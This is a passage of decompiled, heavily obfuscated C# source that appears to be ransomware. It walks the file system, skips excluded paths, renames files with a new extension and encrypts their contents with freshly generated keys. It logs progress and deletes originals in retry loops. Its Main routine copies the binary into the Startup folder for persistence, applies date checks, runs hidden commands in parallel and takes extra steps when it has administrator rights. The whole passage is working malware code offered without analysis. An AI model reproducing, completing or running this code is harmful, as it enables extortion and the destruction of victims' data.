			if (!CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107401327)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107401334)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107401301)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107401252)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107401271)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107401246)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107401193)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107401212)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107401167)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107401130)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107401153)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107401104)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107401110)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107400577)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400520)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400535)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400486)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400501)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400452)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400467)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400418)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400401)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400388)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400367)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107400354)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107400373)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107400324)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().Contains(getString_0(107400339)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(sNXkawcfFmeqKOWI(getString_0(107400802))) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400777)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107397084)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400796)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(NWwyysQYwQDK) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(getString_0(107400739)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(getString_0(107400766)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(getString_0(107400761)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(getString_0(107400756)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(getString_0(107400719)) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(ZLERFztvScvXGTf) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(bDDJFCkjBbYQ) && !CS_0024_003C_003E8__locals0.tDwFwsGDrP.Contains(IKRtRLOSqagD))
			{
				if (OyagJirLxGEcF.Length != 0)
				{
					string[] oyagJirLxGEcF = OyagJirLxGEcF;
					int num = 0;
					while (num < oyagJirLxGEcF.Length)
					{
						string value = oyagJirLxGEcF[num];
						if (!CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1094;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.tDwFwsGDrP.EndsWith(NWwyysQYwQDK))
					{
						goto IL_1094;
					}
				}
				catch (Exception)
				{
					goto IL_1094;
				}
				if (!JEkdiihxCoWf.Contains(CS_0024_003C_003E8__locals0.tDwFwsGDrP))
				{
					if (NgbDiBVJKDTW == getString_0(107396834))
					{
						try
						{
							if (SqYdHlCliRAG.MyilMlfEAq(CS_0024_003C_003E8__locals0.tDwFwsGDrP))
							{
								SqYdHlCliRAG.QRVaUKMRQBopeRUy(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
							}
						}
						catch
						{
						}
					}
					JEkdiihxCoWf.Add(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
					Thread thread = new Thread((ThreadStart)delegate
					{
						try
						{
							if (SidumIOOlYmWUm)
							{
								Console.WriteLine(UgmkrRPmQyDLrq.getString_0(107349548) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + UgmkrRPmQyDLrq.getString_0(107349989) + new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length + UgmkrRPmQyDLrq.getString_0(107349936));
								Console.WriteLine(UgmkrRPmQyDLrq.getString_0(107349523), JEkdiihxCoWf.Count, DPjjDEUnrYJ, ZzaknwGiCeEd);
								Console.WriteLine(UgmkrRPmQyDLrq.getString_0(107349466), VxQUKIskXHMm.Elapsed);
								Console.WriteLine(UgmkrRPmQyDLrq.getString_0(107349959));
							}
						}
						catch
						{
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (!IDUZlSGaIfn.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.tDwFwsGDrP)))
					{
						IDUZlSGaIfn.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.tDwFwsGDrP));
					}
					imzSfhQVzYADk(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
					try
					{
						new lERBUhOhgv().ylvknGhZJxVcmAc(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.tDwFwsGDrP, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (SidumIOOlYmWUm)
								{
									Console.WriteLine(getString_0(107349992) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107349979) + new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length + getString_0(107349926));
									Console.WriteLine(getString_0(107349949));
								}
							}
							catch
							{
							}
							HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107349332)), getString_0(107400667) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107400667) + sNXkawcfFmeqKOWI(getString_0(107349307)) + getString_0(107400667) + Environment.UserName + getString_0(107400667) + sNXkawcfFmeqKOWI(getString_0(107349258)));
						}
					}
					catch (Exception ex2)
					{
						if (SWaMdrdKGgzowGl)
						{
							try
							{
								File.AppendAllText(bDDJFCkjBbYQ, getString_0(107399044) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107349233) + ex2.Message + getString_0(107395942));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length != 0L)
							{
								goto end_IL_0887;
							}
							goto end_IL_0887_2;
							end_IL_0887:;
						}
						catch (Exception ex4)
						{
							if (SWaMdrdKGgzowGl)
							{
								try
								{
									File.AppendAllText(bDDJFCkjBbYQ, getString_0(107399044) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107349184) + ex4.Message + getString_0(107395942));
								}
								catch (Exception)
								{
								}
							}
							ZzaknwGiCeEd++;
							goto end_IL_0887_2;
						}
						if (krdgQbbXWsBnkAs == getString_0(107396834) && new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length > Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024)
						{
							try
							{
								if (NWwyysQYwQDK != getString_0(107398304))
								{
									if (OtvlrYHFRq)
									{
										NWwyysQYwQDK = YgTmUCLcTtww + NWwyysQYwQDK;
									}
									File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK);
								}
							}
							catch (Exception ex6)
							{
								if (SWaMdrdKGgzowGl)
								{
									try
									{
										File.AppendAllText(bDDJFCkjBbYQ, getString_0(107399044) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107349603) + ex6.Message + getString_0(107395942));
									}
									catch (Exception)
									{
									}
								}
								ZzaknwGiCeEd++;
								return;
							}
							if (NWwyysQYwQDK != getString_0(107398304))
							{
								CS_0024_003C_003E8__locals0.tDwFwsGDrP += NWwyysQYwQDK;
							}
							if (pRibgXhmfietto == getString_0(107396834))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item in tnUDcbYyevrzGRJA)
									{
										if (CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.nTnXDlFGnPsXG.NWwyysQYwQDK) && OGIisKmpnCtjYJtSZ == UgmkrRPmQyDLrq.getString_0(107396844))
										{
											if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length)
											{
												try
												{
													aDJKTHVvtfISh.AUzNYWrxJKEB(UgmkrRPmQyDLrq.getString_0(107401482), UgmkrRPmQyDLrq.getString_0(107401477), UgmkrRPmQyDLrq.getString_0(107401432), CS_0024_003C_003E8__locals0.tDwFwsGDrP);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == UgmkrRPmQyDLrq.getString_0(107396410))
										{
											try
											{
												aDJKTHVvtfISh.AUzNYWrxJKEB(UgmkrRPmQyDLrq.getString_0(107401482), UgmkrRPmQyDLrq.getString_0(107401477), UgmkrRPmQyDLrq.getString_0(107401432), CS_0024_003C_003E8__locals0.tDwFwsGDrP);
											}
											catch
											{
											}
										}
									}
								});
								thread2.IsBackground = false;
								thread2.Priority = ThreadPriority.Normal;
								thread2.Start();
							}
							string text = WQPkeOvEci.SBPfmWOaNeINeU(32);
							string text2 = getString_0(107401359);
							text2 = (UpNccIaFzBadyA ? WQPkeOvEci.JZQcnaocigGbMUm() : getString_0(107401359));
							string s = pEVoDrneEBXda.qxtPYzjMemryI(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (dhEsUcbXeBeyR == getString_0(107396400))
							{
								byte[] array = null;
								byte[] byte_ = VbJxNITbKqkCPhG.KlRCrLIVmNrA(CS_0024_003C_003E8__locals0.tDwFwsGDrP, Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024);
								if (!VbJxNITbKqkCPhG.ilkRJUapRp(tRlxUGmSHDq: (!OTLCmOpFsMP) ? (UpNccIaFzBadyA ? VbJxNITbKqkCPhG.QTulHfZYmae(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : VbJxNITbKqkCPhG.QTulHfZYmae(byte_, Convert.FromBase64String(OxsDDfqLEi), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (UpNccIaFzBadyA ? mLvAvjKKGJxbb.RlhTeYZQFxqeS(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : mLvAvjKKGJxbb.RlhTeYZQFxqeS(byte_, Convert.FromBase64String(OxsDDfqLEi), Convert.FromBase64String(lXgIUpLgAi))), THVIvWtEdHnQ: CS_0024_003C_003E8__locals0.tDwFwsGDrP, UjxCrHgnMeLgc: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!UpNccIaFzBadyA)
							{
								if (!WjbOIdEJgeh.eNKyKoZcjDOajb(CS_0024_003C_003E8__locals0.tDwFwsGDrP, bQealBkUmzhp, OxsDDfqLEi, null, Convert.FromBase64String(lXgIUpLgAi)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!WjbOIdEJgeh.eNKyKoZcjDOajb(CS_0024_003C_003E8__locals0.tDwFwsGDrP, bQealBkUmzhp, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (OtvlrYHFRq)
							{
								NWwyysQYwQDK = YgTmUCLcTtww + NWwyysQYwQDK;
							}
							string text3 = WQPkeOvEci.SBPfmWOaNeINeU(32);
							string text4 = getString_0(107401359);
							text4 = (UpNccIaFzBadyA ? WQPkeOvEci.JZQcnaocigGbMUm() : getString_0(107401359));
							string s2 = pEVoDrneEBXda.qxtPYzjMemryI(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (NWwyysQYwQDK != getString_0(107398304))
							{
								if (!NbfRNVirWcO)
								{
									if (!UpNccIaFzBadyA)
									{
										gPkUEdrnpNAX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, nQCMwcWKyQk);
									}
									else
									{
										gPkUEdrnpNAX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!UpNccIaFzBadyA)
										{
											bgAiWEPrFUh(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
										}
										else
										{
											bgAiWEPrFUh(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (SWaMdrdKGgzowGl)
										{
											try
											{
												File.AppendAllText(bDDJFCkjBbYQ, getString_0(107399044) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107398290) + ex11.Message + getString_0(107395942));
											}
											catch (Exception)
											{
											}
										}
										ZzaknwGiCeEd++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!NbfRNVirWcO)
							{
								if (!UpNccIaFzBadyA)
								{
									gPkUEdrnpNAX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107398299), nQCMwcWKyQk);
								}
								else
								{
									gPkUEdrnpNAX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107398299), Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!UpNccIaFzBadyA)
									{
										bgAiWEPrFUh(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
									}
									else
									{
										bgAiWEPrFUh(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (SWaMdrdKGgzowGl)
									{
										try
										{
											File.AppendAllText(bDDJFCkjBbYQ, getString_0(107399044) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107398290) + ex14.Message + getString_0(107395942));
										}
										catch (Exception)
										{
										}
									}
									ZzaknwGiCeEd++;
									return;
								}
							}
							if (UpNccIaFzBadyA)
							{
								if (NWwyysQYwQDK != getString_0(107398304))
								{
									VbClOPiwZbe(CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, bytes2);
								}
								else
								{
									VbClOPiwZbe(CS_0024_003C_003E8__locals0.tDwFwsGDrP, bytes2);
								}
							}
						}
						end_IL_0887_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1094;
			IL_1094:
			aGPipPUJxaM.Remove(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
		}

		static zPoLbQDPrHj()
		{
			Strings.CreateGetStringDelegate(typeof(zPoLbQDPrHj));
		}
	}

	private sealed class LerVzbXIIhQ
	{
		public string JgoRvgBlnpx;

		public string pnnxcTqhyFOc;

		public void _003CEncrypt2_003Eb__44()
		{
			while (true)
			{
				try
				{
					File.Delete(JgoRvgBlnpx);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__45()
		{
			while (true)
			{
				try
				{
					if (File.Exists(pnnxcTqhyFOc))
					{
						File.Delete(pnnxcTqhyFOc);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string mkgreXsNDfWo;

	public static byte[] nQCMwcWKyQk;

	public static string QotWPeyjvzjx;

	public static string FoLsSeMcEVuV;

	public static List<string> eaZULefnOUcJVI;

	public static List<string> DWWiJyUdyGLZ;

	public static string mNPIOHsqKQLjYmM;

	public static string OxsDDfqLEi;

	public static string lXgIUpLgAi;

	public static string GThDVKInjH;

	public static string utoTLqCAZdXAT;

	public static int HxkcxNLXyTDaNa;

	public static string NgbDiBVJKDTW;

	public static string yyZHaDaxUisnQ;

	public static string bLsbDQXmZdNKY;

	public static string gRvYTwveWAbrj;

	public static string aYGZeCWKzRZALiE;

	public static string xssnOTnwBJDngh;

	public static string AUaVXVYfCAD;

	public static string DdPuPlUptL;

	public static List<string> ZislTiThZFHv;

	public static List<string> IDUZlSGaIfn;

	public static string XaypzBwanzwZ;

	public static string EopvfOZJdoX;

	public static string bGtevrhmXNGWmrdhzSx;

	public static List<string> JEkdiihxCoWf;

	public static string HohHoEgJewvBWz;

	private static string JNWYtfmGycaH;

	public static string gsXyoeFOorGZ;

	public static string vNvhWDXlFGgZo;

	public static List<string> SoVrjAqLQHDY;

	public static List<string> tKhSHdXkDw;

	public static List<string> FcllHXSYzCkoLu;

	public static List<string> MRwbBvIEaNYw;

	public static string fJgPhlsQHtYagv;

	public static List<string> KIKFUpmawnRBIE;

	public static List<string> WjopLCEDSl;

	public static string dNiPJscrdZ;

	public static string pRwaCpJBKvM;

	internal static DateTime AiPmmCrNxON;

	internal static DateTime TyxvmRxEqTldBX;

	public static string krdgQbbXWsBnkAs;

	public static string bQealBkUmzhp;

	public static string IjKkEPdMxTo;

	public static string SsLdaQJOERuN;

	public static string zCYQvPmGdWb;

	public static string SwTuLSeNkXgX;

	public static string GZbePnAiKIwM;

	public static string pRibgXhmfietto;

	public static List<string> tnUDcbYyevrzGRJA;

	public static string OGIisKmpnCtjYJtSZ;

	public static string dKLzVpzOOKvyJbR;

	public static string HmOIvziEgj;

	public static string wWsTKhWTnA;

	public static string ceBfodBwRY;

	public static string YrUNJYkfZORc;

	public static string TECyIxCjZZeuQoS;

	public static string TLvIKeJnVejcNG;

	public static string cfLMhLbiCC;

	public static string dPIYrIPkEeCv;

	public static string LfrLWEkFCBwUa;

	public static string LHozEvFKfaDyxN;

	public static string ZQLLErbedcYeoR;

	public static string sWPChGvxft;

	public static string iEmzWvVANWWhs;

	public static string OXmgxFpvUExT;

	public static string EMMMLIMedETY;

	public static string OOffFbZtXHucK;

	public static string eBjqIYGqqxZnwj;

	public static string ZLERFztvScvXGTf;

	public static string ThomocmQwcHBb;

	public static string jIEUXOWHIovDRKPS;

	public static string lanIsMFtITLe;

	public static string cFytzeDiRIaBA;

	public static string ueuvoVAMScuH;

	public static string cXFsslHOuYyK;

	public static string dhEsUcbXeBeyR;

	public static string pUPogXfTsHTC;

	public static string XxUTdtdLXHJQFmlnR;

	public static string[] upziyoWzyCa;

	public static string RrpEvBQBLONZKo;

	public static bool OTLCmOpFsMP;

	public static string EBZNaOLOtuSLZ;

	public static bool UpNccIaFzBadyA;

	public static bool GyAtBojDqJQga;

	public static bool ZuXmDgobJnjb;

	public static bool XeXEhFhfYVvh;

	public static string bDDJFCkjBbYQ;

	public static bool SWaMdrdKGgzowGl;

	public static bool UaZSFbxCjFNZv;

	public static bool jnImjWIMcpl;

	public static bool bTMUTlJGkGOO;

	public static bool NbfRNVirWcO;

	public static string IKRtRLOSqagD;

	public static bool SidumIOOlYmWUm;

	public static Stopwatch VxQUKIskXHMm;

	public static int ZzaknwGiCeEd;

	public static int DPjjDEUnrYJ;

	public static bool OtvlrYHFRq;

	public static string YgTmUCLcTtww;

	public static string[] PheHPPQQekLUCKI;

	public static List<string> GDqBfWNbeWwjD;

	public static int PGvCWVOLTGYXz;

	public static bool uBpdQdBJjeZ;

	public static bool DBkpQAKkEJYsTWP;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegateb;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	private static extern bool AllocConsole();

	[DllImport("kernel32.dll")]
	private static extern bool SetProcessShutdownParameters(uint uint_0, uint uint_1);

	private static void Main(string[] args)
	{
		try
		{
			qfTxGPzVjXWk CS_0024_003C_003E8__locals0 = new qfTxGPzVjXWk();
			CS_0024_003C_003E8__locals0.vjohKiJyzSRaUeWhX = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.vjohKiJyzSRaUeWhX) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			fZsmcMLWUEcO.KKtYRaEzLSHY(JNWYtfmGycaH);
		}
		catch (Exception)
		{
		}
		try
		{
			if (cXFsslHOuYyK == getString_0(107396816))
			{
				Thread thread = new Thread(dLyCLjnNAeXDB.WKJjrYoVySB);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		SetProcessShutdownParameters(0u, 0u);
		if (bLsbDQXmZdNKY == getString_0(107396816))
		{
			Thread.Sleep(int.Parse(gRvYTwveWAbrj));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && GZbePnAiKIwM == getString_0(107396816))
		{
			try
			{
				RdYwqXqmYPnb(sNXkawcfFmeqKOWI(getString_0(107396843)));
			}
			catch
			{
			}
		}
		try
		{
			if (AUaVXVYfCAD == getString_0(107396816) && fdxaIwaJlAs.wmyveZmknpdtU())
			{
				new btcnmxOkzDY().dnjIozwnDTI(bool_0: false);
				fdxaIwaJlAs.pVIUQeRWcI();
			}
		}
		catch (Exception)
		{
		}
		if (EopvfOZJdoX == getString_0(107396816) && fdxaIwaJlAs.wmyveZmknpdtU())
		{
			new btcnmxOkzDY().dnjIozwnDTI(bool_0: false);
			new btcnmxOkzDY().JQoQzrGBFnzT();
		}
		if (yyZHaDaxUisnQ == getString_0(107396816))
		{
			bTUobkygRNEN.DnduRlOUEnX();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396738);
			string text2 = text + Path.GetFileName(fileName);
			if (utoTLqCAZdXAT == getString_0(107396816) && fileName != text2)
			{
				Thread thread2 = new Thread(rOtiAFqspWPBRghE);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (mNPIOHsqKQLjYmM == getString_0(107396816) && mainModule != null && fileName != text2)
			{
				try
				{
					HxkcxNLXyTDaNa = vEzbOdrkUR(0, ZislTiThZFHv.Count);
					File.Copy(fileName, text + ZislTiThZFHv[HxkcxNLXyTDaNa], overwrite: true);
					Process.Start(text + ZislTiThZFHv[HxkcxNLXyTDaNa]);
					nowMmKZNVgcmM();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (dNiPJscrdZ == getString_0(107396816) && DateTime.Now < AiPmmCrNxON)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (pRwaCpJBKvM == getString_0(107396816) && DateTime.Now > TyxvmRxEqTldBX)
			{
				nowMmKZNVgcmM();
			}
		}
		catch
		{
		}
		try
		{
			AllocConsole();
			Console.Title = getString_0(107397213);
			if (ZQLLErbedcYeoR == getString_0(107396816))
			{
				Console.WriteLine(getString_0(107397075));
			}
			VxQUKIskXHMm.Start();
		}
		catch
		{
		}
		lhyglJDROXnz();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegateb == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegateb = delegate
			{
				List<string> source = tKhSHdXkDw;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
					{
						HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107398731)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
				List<string> fcllHXSYzCkoLu = FcllHXSYzCkoLu;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107398686)), string_0);
					};
				}
				Parallel.ForEach(fcllHXSYzCkoLu, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				if (XxUTdtdLXHJQFmlnR == getString_0(107396816))
				{
					string[] source2 = upziyoWzyCa;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
						{
							HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107398686)), getString_0(107398693) + string_0 + getString_0(107398652));
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				}
				if (!znndCnnZrNYoVh().Contains(getString_0(107398412)))
				{
					fBleBDBVVYJJ(fJgPhlsQHtYagv);
				}
				else
				{
					List<string> mRwbBvIEaNYw = MRwbBvIEaNYw;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							HnVlWPPowq(sNXkawcfFmeqKOWI(UIqHgaUGjSA(getString_0(107398647))), string_0);
						};
					}
					Parallel.ForEach(mRwbBvIEaNYw, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				List<string> kIKFUpmawnRBIE = KIKFUpmawnRBIE;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107398622)), string_0);
					};
				}
				Parallel.ForEach(kIKFUpmawnRBIE, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegateb);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397066))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397066)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107397017)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !eaZULefnOUcJVI.Contains(text6) && text6 != getString_0(107397028) && text6 != getString_0(107397007) && text6 != getString_0(107396442))
								{
									eaZULefnOUcJVI.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107396413)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107396400))
						{
							ZQLLErbedcYeoR = getString_0(107396816);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107396423))
						{
							ZQLLErbedcYeoR = getString_0(107396382);
						}
					}
					if (text3.Contains(getString_0(107396377)))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
